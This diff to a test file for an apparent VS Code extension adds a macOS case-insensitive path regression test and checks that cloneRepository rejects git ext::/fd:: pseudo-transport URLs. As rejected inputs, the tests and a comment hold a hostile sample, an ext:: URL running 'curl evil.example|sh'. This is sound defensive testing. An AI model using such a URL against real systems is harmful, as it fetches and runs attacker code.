@@ -16,6 +16,17 @@ const assert = require('assert');
 const { importDist } = require('./lib/import-dist.cjs');
 const vscode = require('./lib/vscode-stub.cjs');
 
+// `gitConfigSource.ts` binds `execFileAsync = promisify(child_process.execFile)` the moment it is
+// first required, so the stub must be installed on the real `child_process` module *before* that
+// first `importDist('workspace/gitConfigSource')` below — reassigning `execFile` afterwards would
+// not be picked up by the already-created `execFileAsync`. The indirection (`execFileHandler` is a
+// `let`, reassigned per test) lets each test case below install its own behavior without re-import.
+const childProcess = require('child_process');
+let execFileHandler = () => {
+	throw new Error('execFile not stubbed for this test');
+};
+childProcess.execFile = (...args) => execFileHandler(...args);
+
 const {
 	deriveTenantNaming,
 	deriveTenantNamings,
@@ -23,7 +34,7 @@ const {
 	isParsableL3File,
 	isBusinessConfigFile,
 } = importDist('workspace/l3Discovery');
-const { isFolderEmpty, isPathContainedIn } = importDist('workspace/gitConfigSource');
+const { isFolderEmpty, isPathContainedIn, cloneRepository } = importDist('workspace/gitConfigSource');
 const { TenantNode } = importDist('tree/multiTenantNodes');
 const { readGitSourceMarker, writeGitSourceMarker } = importDist('workspace/gitSourceMarker');
 const { EnvironmentManager } = importDist('workspace/environmentManager');
@@ -89,6 +100,25 @@ const { GitFolderNode, EnvironmentNode } = importDist('tree/multiTenantNodes');
 		const ids = clashes.map(x => x.tenantId);
 		assert.deepStrictEqual(ids, ['shared (DP/shared)', 'shared (MDM/shared)', 'unique']);
 		assert.strictEqual(new Set(ids).size, ids.length, 'tenantIds must be unique');
+
+		// Regression: APFS (macOS's default filesystem) is case-insensitive but
+		// case-preserving, same as NTFS — a workspace root and a file discovered beneath it
+		// can differ in case while being the same path on disk (e.g. opened via a symlink
+		// spelled differently from its target). Before this was fixed, only win32 compared
+		// case-insensitively; on darwin a case mismatch fell through to treating the whole
+		// absolute path as "relative", which then got fed into folder/environment naming.
+		const platformDescriptor = Object.getOwnPropertyDescriptor(process, 'platform');
+		try {
+			Object.defineProperty(process, 'platform', { value: 'darwin', configurable: true });
+			const differentCaseRoot = vscode.Uri.file('/Repo/My-Config-Repo');
+			const sameFileDifferentCase = vscode.Uri.file('/repo/my-config-repo/DP/dp_lif/BusinessConfig.json');
+			const onDarwin = deriveTenantNaming(differentCaseRoot, sameFileDifferentCase, [sameFileDifferentCase]);
+			assert.strictEqual(onDarwin.tenantId, 'dp_lif',
+				'a case-only mismatch between root and file must still resolve on darwin, like it already does on win32');
+			assert.deepStrictEqual(onDarwin.folders, ['DP']);
+		} finally {
+			if (platformDescriptor) Object.defineProperty(process, 'platform', platformDescriptor);
+		}
 
 		// The qualifier is identity only. The tree already nests the row under its folder rows,
 		// so echoing the path in the label just adds noise: `shared`, not `shared (DP/shared)`.
@@ -479,6 +509,68 @@ const { GitFolderNode, EnvironmentNode } = importDist('tree/multiTenantNodes');
 		);
 
 		vscode.workspace.fs.readDirectory = originalReadDirectory;
+	}
+
+	// --- cloneRepository: URL scheme validation -----------------------------
+	// RP-like finding (path-traversal review, see `isValidProcessId` fix in the same pass):
+	// git's `ext::`/`fd::` pseudo-transports treat the "URL" as a shell command to run
+	// (e.g. `ext::sh -c 'curl evil|sh'`). Modern git disables them by default for clone/fetch,
+	// but only for an installed git new enough and not reconfigured — this extension cannot rely
+	// on that, so `cloneRepository()` validates the scheme itself before ever shelling out.
+	{
+		const dest = vscode.Uri.file('/clone-dest');
+
+		// A valid https:// URL passes through unchanged, and the safety flags are always present.
+		let captured;
+		execFileHandler = (_file, args, _options, callback) => {
+			captured = args;
+			callback(null, { stdout: '', stderr: '' });
+		};
+		await cloneRepository('https://bitbucket.org/acme/acme-workflows.git', dest);
+		assert.ok(captured.includes('https://bitbucket.org/acme/acme-workflows.git'), 'a valid https:// URL must reach execFile unchanged');
+		assert.deepStrictEqual(
+			captured.slice(0, 4),
+			['-c', 'protocol.ext.allow=never', '-c', 'protocol.fd.allow=never'],
+			'the ext/fd protocol-disable flags must always precede the clone subcommand, valid URL or not',
+		);
+		assert.ok(captured.includes('clone'), 'the clone subcommand must still be present after the safety flags');
+
+		// ssh:// and git@host:path (SCP-like) URLs are also accepted unchanged.
+		for (const url of ['ssh://git@bitbucket.org/acme/acme-workflows.git', 'git@bitbucket.org:acme/acme-workflows.git']) {
+			captured = undefined;
+			execFileHandler = (_file, args, _options, callback) => {
+				captured = args;
+				callback(null, { stdout: '', stderr: '' });
+			};
+			await cloneRepository(url, dest);
+			assert.ok(captured && captured.includes(url), `expected ${url} to reach execFile unchanged, got: ${JSON.stringify(captured)}`);
+		}
+
+		// An ext:: / fd:: pseudo-transport URL must be rejected before execFile is ever called.
+		for (const evilUrl of ["ext::sh -c 'curl evil.example|sh'", 'fd::1']) {
+			let execFileCalled = false;
+			execFileHandler = () => {
+				execFileCalled = true;
+				throw new Error('execFile must not be called for a rejected URL');
+			};
+			await assert.rejects(
+				() => cloneRepository(evilUrl, dest),
+				/Unsupported git URL/,
+				`expected ${evilUrl} to be rejected`,
+			);
+			assert.strictEqual(execFileCalled, false, `execFile must never be invoked for ${evilUrl}`);
+		}
+
+		// A bare path or a file:// URL (not one of the shapes a user is asked to paste) is rejected too.
+		for (const badUrl of ['/local/path/to/repo', 'file:///local/path/to/repo']) {
+			let execFileCalled = false;
+			execFileHandler = () => {
+				execFileCalled = true;
+				throw new Error('execFile must not be called for a rejected URL');
+			};
+			await assert.rejects(() => cloneRepository(badUrl, dest), /Unsupported git URL/);
+			assert.strictEqual(execFileCalled, false, `execFile must never be invoked for ${badUrl}`);
+		}
 	}
 
 	console.log('test-git-repository-source: OK');
